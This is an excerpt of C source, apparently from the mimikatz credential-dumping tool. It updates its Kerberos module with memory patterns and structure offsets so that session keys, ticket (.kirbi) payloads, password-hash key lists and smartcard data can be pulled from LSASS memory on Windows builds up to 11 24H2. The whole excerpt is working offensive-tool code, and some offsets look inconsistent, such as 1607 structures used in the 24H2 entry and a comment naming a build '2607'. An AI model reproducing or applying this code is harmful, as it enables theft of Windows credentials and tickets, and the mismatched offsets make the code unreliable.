...
KULL_M_PATCH_GENERIC KerberosReferences[] = {
	...
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 8}},
	{KULL_M_WIN_BUILD_2022,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 9}},
	{KULL_M_WIN_BUILD_11_24H2,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 10}},
};
...
const KERB_INFOS kerbHelper[] = {
	...
	// KULL_M_WIN_BUILD_10_1809
	{
		...
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, KeyType),   // KeyType (adjusted for 1809)
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, RenewUntil),
	...
	// KULL_M_WIN_BUILD_2022 (windows 21H2)
	{
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, LocallyUniqueIdentifier),
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, credentials),
		{
		...
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, ClientName),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, TicketFlags),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, KeyType),   // KeyType (adjusted for 2022), the difference from 2607 to 24H2 is correct and working : just the layout changed so if you still use the 1607's offset you read 4 bytes before (a whole ULONG).
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, Key),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, StartTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, EndTime),
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_1607, RenewUntil),
	...
	// KULL_M_WIN_BUILD_11_24H2
	{
		/* Logon Session Offsets */
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_24H2, LocallyUniqueIdentifier),   // LocallyUniqueIdentifier (LUID)
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_24H2, credentials),   // credentials ('type' is at 0x60, so UserName lands at 0x78)
		{
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_24H2, Tickets_1),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_24H2, Tickets_2),
			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_24H2, Tickets_3),
		},
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_24H2, SmartcardInfos),  // SmartcardInfos
		sizeof(KIWI_KERBEROS_LOGON_SESSION_10_24H2),  // sizeof(KERB_LOGON_SESSION)

		/* Internal Ticket (KERB_TICKET_CACHE_ENTRY) Offsets */
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, ServiceName),   // ServiceName
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, TargetName),   // TargetName
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, DomainName),   // DomainName
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, TargetDomainName),   // TargetDomainName
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, Description),   // Description
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, AltTargetDomainName),   // AltTargetDomainName (Full SPN)
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, ClientName),   // ClientName
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, TicketFlags),   // TicketFlags
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, KeyType),   // KeyType
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, Key),   // Key (Session Key Pointer)
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, StartTime),   // StartTime
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, EndTime),  // EndTime
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, RenewUntil),  // RenewUntil
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, TicketEncType),   // TicketEncType
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, Ticket),  // Ticket (Pointer to .kirbi payload)
		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2, TicketKvno),   // TicketKvno
		sizeof(KIWI_KERBEROS_INTERNAL_TICKET_10_24H2),  // sizeof(KERB_TICKET_CACHE_ENTRY)

		/* Key List & Hash Offsets */
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_24H2, pKeyList),  // pKeyList
		sizeof(KIWI_KERBEROS_KEYS_LIST_6),
		FIELD_OFFSET(KERB_HASHPASSWORD_10_24H2, generic),
		sizeof(KERB_HASHPASSWORD_10_24H2),

		/* Smartcard / CSP Offsets */
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspDataLength),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData),

		/* Primary Credential Sub-structure Offsets */
		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, credentials) + FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, unkFunction),
		sizeof(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607) - FIELD_OFFSET(KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, unkFunction)
	},
};
